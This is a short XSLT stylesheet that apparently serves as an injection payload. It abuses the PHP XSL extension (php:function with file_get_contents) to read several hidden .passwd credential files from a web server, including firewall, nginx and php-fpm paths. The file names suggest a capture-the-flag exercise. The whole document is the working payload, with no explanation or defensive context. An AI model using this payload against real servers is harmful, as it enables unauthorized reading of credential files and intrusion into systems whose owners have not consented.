<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
<xsl:value-of select="php:function('file_get_contents','._firewall/.passwd')"/>
<xsl:value-of select="php:function('file_get_contents','._nginx.http-level.inc/.passwd')"/>
<xsl:value-of select="php:function('file_get_contents','._nginx.server-level.inc/.passwd')"/>
<xsl:value-of select="php:function('file_get_contents','._php-fpm.pool.inc.passwd')"/>
</xsl:template>
</xsl:stylesheet>